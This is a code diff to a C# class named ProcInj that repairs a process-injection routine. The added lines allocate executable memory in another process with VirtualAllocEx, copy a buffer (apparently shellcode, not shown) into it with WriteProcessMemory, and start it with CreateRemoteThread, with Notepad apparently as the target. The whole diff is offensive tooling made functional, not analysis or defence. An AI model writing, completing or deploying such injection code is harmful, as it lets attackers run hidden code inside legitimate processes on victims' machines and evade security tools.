@@ -58,7 +58,7 @@ public class ProcInj
 
     {
 
-        int inject = ref NotepadStart();
+        int inject = NotepadStart();
         if (inject == 1)
         {
             Console.WriteLine("process injection complete");
@@ -94,7 +94,7 @@ public class ProcInj
             exitCode = proc.ExitCode;
         }
 
-        return ref exitCode;
+        return exitCode;
     }
 
     private static void Injector()
@@ -111,11 +111,13 @@ public class ProcInj
 
     static bool UnsfInj(IntPtr h)
     {
-        IntPtr memAlloc = VirtualAllocEx(Buf.Length);
+        IntPtr memAlloc = VirtualAllocEx(h, IntPtr.Zero, Buf.Length, 0x00001000, 0x40);
 
-        WriteProcessMemory();
+        UIntPtr outout;
+        WriteProcessMemory(h, memAlloc , Buf, (uint)(Buf.Length), out outout);		
+        
 
-        if (CreateRemoteThread())
+        if (CreateRemoteThread(h, IntPtr.Zero, 0, memAlloc , IntPtr.Zero, 0,IntPtr.Zero) != IntPtr.Zero)
         {
             Console.Write("injection complete!");
             return true;
